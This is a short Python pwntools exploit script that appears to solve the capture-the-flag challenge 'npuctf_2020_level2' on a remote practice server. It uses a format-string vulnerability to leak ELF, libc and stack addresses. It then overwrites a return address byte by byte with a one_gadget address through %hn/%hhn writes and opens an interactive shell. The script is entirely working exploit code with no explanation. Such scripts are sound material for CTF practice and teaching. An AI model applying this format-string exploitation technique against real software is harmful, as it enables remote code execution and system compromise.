from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('npuctf_2020_level2')
io = remote('node4.buuoj.cn', 26442)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.27.so')
elf = ELF('npuctf_2020_level2')

io.sendline('%6$p%7$p%9$p')
elf_base = int(io.recvn(14), 16) - 0x830
libc_base = int(io.recvn(14), 16) - libc.sym['__libc_start_main'] - 231
stack = int(io.recvn(14), 16)
log.success('elf_base: ' + hex(elf_base))
log.success('libc_base: ' + hex(libc_base))
log.success('stack: ' + hex(stack))

# one_gadget = libc_base + 0x4f432
one_gadget = libc_base + 0x4f322
ret_addr = stack - 0xe0
log.success('one_gadget: ' + hex(one_gadget))
log.success('ret_addr: ' + hex(ret_addr))

for i in range(3):
    sleep(0.1)
    payload = b'%' + str.encode(str((ret_addr & 0xffff) + i)) + b'c%9$hn\x00'
    io.send(payload)
    sleep(0.1)
    target = (one_gadget >> (i * 8)) & 0xff
    payload = b'%' + str.encode(str(target)) + b'c%35$hhn\x00'
    io.send(payload)


sleep(0.1)
io.send(b'66666666\x00')
io.interactive()

